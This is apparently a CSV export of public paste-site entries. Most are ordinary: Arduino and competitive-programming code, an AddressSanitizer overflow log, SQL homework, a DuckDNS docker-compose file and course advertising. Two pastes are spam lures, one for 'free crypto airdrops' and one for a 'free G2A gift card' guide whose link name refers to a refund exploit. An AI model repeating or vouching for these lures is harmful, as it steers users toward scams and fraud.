id,title,username,language,date,content
zm9d4Ki5,data823,TestGuy1,JSON,Friday 26th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd3472cedefc8df5bf5aef9824c47a76724be103db75e71b786361fbba32efca37061cd13c51ada6c58c4ae10387ebc04440f83e76d626162f429b85ba612b2c50a97f9f946668b88a4390409f24263ccd64ff42a09cd97c7ab554617e2bce74a19bc219189d5930f62bd9509e2f3f526136473a492d4900209870eb77f87e64f',
  otherdata: [
    '75b92b2d2cc92392db7956e72aff71e3',
    '533b16c032b59d24ac545d9ac146a9ea',
    '34a7625388ae007d4a38bead40619d18',
    'a687e215ada3a1d26c5e9d412dac4f97',
    'a67cefec91cb03ed236b36aa3b75ae13',
    '6eb37d5485f618da8101bb1d84eccf95',
    '726c5260dc1f26c4342f6615b22839d3',
    '04159667e46138c9fe7ea413db6ab90c'
  ]
}"
yLgHYEZC,stepper_jan26,uuu000,C++,Friday 26th of January 2024 05:53:18 AM CDT,"// Include the AccelStepper Library
#include <AccelStepper.h>

// Define pin connections
const int dirPin = 2;
const int stepPin = 3;

// Define motor interface type
#define motorInterfaceType 1

// Creates an instance
AccelStepper myStepper(motorInterfaceType, stepPin, dirPin);

void setup() {
	// set the maximum speed, acceleration factor,
	// initial speed and the target position
	myStepper.setMaxSpeed(1000);
	myStepper.setAcceleration(50);
	myStepper.setSpeed(400);
	myStepper.moveTo(400);
}

void loop() {
	// Change direction once the motor reaches target position
	if (myStepper.distanceToGo() == 0) 
		myStepper.moveTo(-myStepper.currentPosition());

	// Move the motor one step
	myStepper.run();
}"
TnmGKTmU,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Friday 26th of January 2024 05:48:44 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

459844"
8LJMe5DJ,AsanVector,cepxuozab,C++,Friday 26th of January 2024 05:42:14 AM CDT,"==9600==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1270b27a0380 at pc 0x7ffcbe0846cf bp 0x0073e1afdce0 sp 0x0073e1afd480
WRITE of size 16 at 0x1270b27a0380 thread T0
==9600==WARNING: Failed to use and restart external symbolizer!
    #0 0x7ffcbe0846ce in _asan_wrap_memset+0x19e (C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\bin\HostX64\x64\clang_rt.asan_dynamic-x86_64.dll+0x1800346ce)
    #1 0x7ff6abed1d33 in std::_Fill_zero_memset<int *> C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\include\xutility:5003
    #2 0x7ff6abed4b88 in std::fill<int *,int> C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\include\xutility:5036
    #3 0x7ff6abed7783 in SimpleVector<int>::Resize C:\Users\Dell\Downloads\project (2)\simple_vector.h:202
    #4 0x7ff6abed65d4 in SimpleVector<int>::Insert C:\Users\Dell\Downloads\project (2)\simple_vector.h:118
    #5 0x7ff6abedbeb8 in Test2 C:\Users\Dell\Downloads\project (2)\tests.h:221
    #6 0x7ff6abed1074 in main C:\Users\Dell\Downloads\project (2)\main.cpp:13
    #7 0x7ff6abede0c8 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #8 0x7ff6abede01d in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #9 0x7ff6abeddedd in __scrt_common_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:330
    #10 0x7ff6abede13d in mainCRTStartup D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp:16
    #11 0x7ffd2d727613 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017613)
    #12 0x7ffd2f6226b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)

0x1270b27a0380 is located 0 bytes to the right of 16-byte region [0x1270b27a0370,0x1270b27a0380)
allocated by thread T0 here:
    #0 0x7ff6abedcffe in operator new[] D:\a\_work\1\s\src\vctools\asan\llvm\compiler-rt\lib\asan\asan_win_new_array_thunk.cpp:41
    #1 0x7ff6abed549b in ArrayPtr<int>::ArrayPtr<int> C:\Users\Dell\Downloads\project (2)\array_ptr.h:17
    #2 0x7ff6abed589f in SimpleVector<int>::SimpleVector<int> C:\Users\Dell\Downloads\project (2)\simple_vector.h:41
    #3 0x7ff6abedbe16 in Test2 C:\Users\Dell\Downloads\project (2)\tests.h:220
    #4 0x7ff6abed1074 in main C:\Users\Dell\Downloads\project (2)\main.cpp:13
    #5 0x7ff6abede0c8 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #6 0x7ff6abede01d in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #7 0x7ff6abeddedd in __scrt_common_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:330
    #8 0x7ff6abede13d in mainCRTStartup D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp:16
    #9 0x7ffd2d727613 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017613)
    #10 0x7ffd2f6226b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)

SUMMARY: AddressSanitizer: heap-buffer-overflow (C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\bin\HostX64\x64\clang_rt.asan_dynamic-x86_64.dll+0x1800346ce) in _asan_wrap_memset+0x19e
Shadow bytes around the buggy address:
  0x04bac8c74020: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74030: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74040: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x04bac8c74050: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fa
  0x04bac8c74060: fa fa fd fa fa fa fd fa fa fa fd fd fa fa 00 00
=>0x04bac8c74070:[fa]fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c74080: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c74090: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740a0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740b0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x04bac8c740c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb"
8zfWw5dS,puncakes,D_L3,C++,Friday 26th of January 2024 05:34:42 AM CDT,"#include <map>
#include <set>
#include <list>
#include <cmath>
#include <ctime>
#include <deque>
#include <queue>
#include <stack>
#include <string>
#include <bitset>
#include <cstdio>
#include <limits>
#include <vector>
#include <climits>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <numeric>
#include <sstream>
#include <iostream>
#include <algorithm>
#include <unordered_map>

using namespace std;


size_t result = -1;

void binarySearch(size_t min, size_t max, size_t target, const vector<size_t>& times){
    while(min <= max){
        size_t mid = min + (max - min) / 2;
        size_t pancakesSorFar = 0;
        for(size_t time : times)
            pancakesSorFar += (mid / time);

        if(pancakesSorFar >= target){
            result = mid;
            max = mid - 1;
        }
        else{
            min = mid + 1;
        }
    }
}

int main() {
    size_t n, k;
    cin >> n >> k;
    size_t maxTime = 0;
    vector<size_t> times(k);
    for(size_t i =0; i < k; i++){
        cin >> times[i];

        if(times[i] > maxTime)
            maxTime = times[i];
    }
    binarySearch(1, n * maxTime, n, times);
    
    cout << result;
    return 0;
}"
LJ3mPd3R,Untitled,Rofyda_Elghadban1,C++,Friday 26th of January 2024 05:24:48 AM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */

 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 bool student(int n,int s,vector<int>v){
  sort(all(v));
  for(int i=0;i<n;i++){
    if((i+s-1)<n&&(v[i+s-1]-v[i])<=5&&s<=n){
      return true;
    }
  }
  return false;
 }

 void solve(){
  int n,s;
  cin>>n>>s;
  vector<int>v(n);
  cin(v);
  cout<<student(n,s,v)<<""\n"";
 }

 int main(){
  Rofyda_Elghadban(); 
  // int t;
  // cin>>t;
  // while(t--){
  //   solve();
  // }
  solve();
  return 0;
 }

"
eLBmtiFj,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Friday 26th of January 2024 05:08:47 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_723606.pdf
 
Working as of
26 January 2024"
tUrnkYZS,Untitled,rkj,MySQL,Friday 26th of January 2024 05:05:16 AM CDT,"-- 1. Wyświetl rozmiary utworów należących do gatunków, których nazwa składa się z co najmniej dwóch słów.
-- Wyniki posortuj według czasu trwania w porządku malejącym
SELECT t.bytes
FROM tracks t
JOIN genres g ON g.genre_id = t.genre_id
WHERE LEN(g.name) - LEN(REPLACE(g.name, ' ', '')) >= 1
ORDER BY t.milliseconds DESC

-- 2. Wyświetl imiona i nazwiska klientów, którzy złożyli zamówienie w marcu albo we wrześniu. Zastosuj aliay imie, nazwisko
SELECT c.first_name AS imie, c.last_name AS nazwisko
FROM customers c
JOIN orders o ON o.customer_id = c.customer_id
WHERE MONTH(o.order_date) = 3 OR MONTH(o.order_date) = 9

-- 3. Wyświetl tytuły utworów które nie naleza do playlisty
SELECT t.title
FROM tracks t
LEFT JOIN playlists_tracks pt ON pt.track_id = t.track_id
WHERE pt.playlist_id IS NULL

-- 4.Dla każdego artysty wyświetl jego nazwę oraz średni czas jego utworów. Uwzględni tylko tych gdzie ta wartość < 250000
SELECT a.name, AVG(t.milliseconds)
FROM artists a
JOIN albums al ON a.artist_id = al.artist_id
JOIN tracks t ON t.album_id = al.album_id
GROUP BY a.name
HAVING AVG(t.milliseconds) < 250000

-- 5.Wyświetl imiona i nazwiska klientów, którzy złożyli najwięcej zamówień
SELECT c.first_name, c.last_name, COUNT(o.order_id)
FROM customers c
JOIN orders o ON o.customer_id = c.customer_id
GROUP BY c.first_name, c.last_name
HAVING COUNT(o.order_id) >= ALL (
	SELECT COUNT(o2.order_id)
	FROM customers c2
	JOIN orders o2 ON o2.customer_id = c2.customer_id
	GROUP BY c2.customer_id
)
-- 6.Dla każego zamówienia wyświetl jego datę oraz tytuły zakupionych utworów o najmniejszym rozmiarze
SELECT o.order_date, t.title
FROM orders o
JOIN orders_tracks ot ON ot.order_id = o.order_id
JOIN tracks t ON t.track_id = ot.track_id
WHERE t.bytes = (
	 SELECT MAX(t2.bytes)
	 FROM tracks t2
	 JOIN orders_tracks ot2 ON ot2.track_id = t2.track_id
	 JOIN orders o2 ON o2.order_id = ot2.order_id
	 WHERE o2.order_id = o.order_id
)"
Ca8qzPnF,Untitled,Alandil,Bash,Friday 26th of January 2024 05:00:56 AM CDT,"version: ""2.1""
secrets:
    SECRET_TOKEN:
        file: /mnt/NVME1/home/fabien/secrets/token.txt

services:
    duckdns:
        image: lscr.io/linuxserver/duckdns:latest
        container_name: duckdns-tst
        # ###############
        labels:
        # Le label ci-dessous permet à Diun de notifier la présence de nouvelle mise à jour
        # Cela peut être supprimé si Diun n'est pas utilisé.
            - diun.enable=true
        # Le label ci-dessous permet à DeUnhealth de redémarrer automatiquement le conteneur
        # Cela peut être supprimé si DeUnhealth n'est pas utilisé.
            - deunhealth.restart.on.unhealthy=true
        # ###############
        secrets:
            - SECRET_TOKEN
        # ###############
        networks:
            default:
        # Définition de l'adresse IP du conteneur à l'intérieur du bridge
                ipv4_address: 172.99.0.2
        # ###############
        environment:
            - PUID=${PUID}
            - PGID=${PGID}
            - TZ=${TZ}
        # Définition des sous-domaines de DuckDNS à mettre à jour sur l'IP externe de la machine.  
        # Possible d'en définir plus d'un avec une virgule entre chaque
            - SUBDOMAINS=${SUBDOMAINS}
            - FILE__TOKEN=/run/secrets/SECRET_TOKEN
            - LOG_FILE=false #optional
        # ###############
        volumes:
            - ${RACINE_CONF_CONTENEURS}/duckdns/:/config #optional
        # ###############
        restart: unless-stopped
        # ###############


networks:
    #Définition du bridge utilisé par l'ensemble des conteneurs configurés dans ce stack
    default:
        name: test_network
        driver: bridge
        ipam:
            config:
                - subnet: 172.99.0.0/24
                  gateway: 172.99.0.1"
y7xG2cG4,Untitled,sissou123,Java,Friday 26th of January 2024 04:56:33 AM CDT,"Java In-Depth: Become a Complete Java Engineer!
Comprehensive Java programming course integrated with design principles, best practices &amp; instructor-led Java EE project
 
What you'll learn
An industry-vetted, comprehensive curriculum to help you master Core & Advanced Java including JVM internals
Master design principles, best practices and coding conventions for writing well-designed, professional Java code 
for more:https://linkjust.com/3iUiw0zeZGWafGmHqvy5F5zTd6j
"
